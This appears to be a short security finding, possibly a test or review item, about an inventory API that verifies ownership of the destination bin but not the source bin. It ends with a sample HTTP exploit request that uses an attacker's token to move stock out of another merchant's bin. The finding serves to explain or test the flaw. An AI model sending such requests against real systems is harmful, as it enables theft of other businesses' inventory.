diagnosis: Inside the multi-step async context manager, the route verifies that destination_bin belongs to current_user.merchant_id, but completely skips checking ownership of source_bin. An attacker can specify another merchant's bin ID as source_bin_id to siphon stock into their own bins.
exploit_request:
POST /api/v1/inventory/reallocate-bin HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"source_bin_id": "bin_loc_4091_alpha", "destination_bin_id": "bin_loc_1002_omega", "quantity": 50}
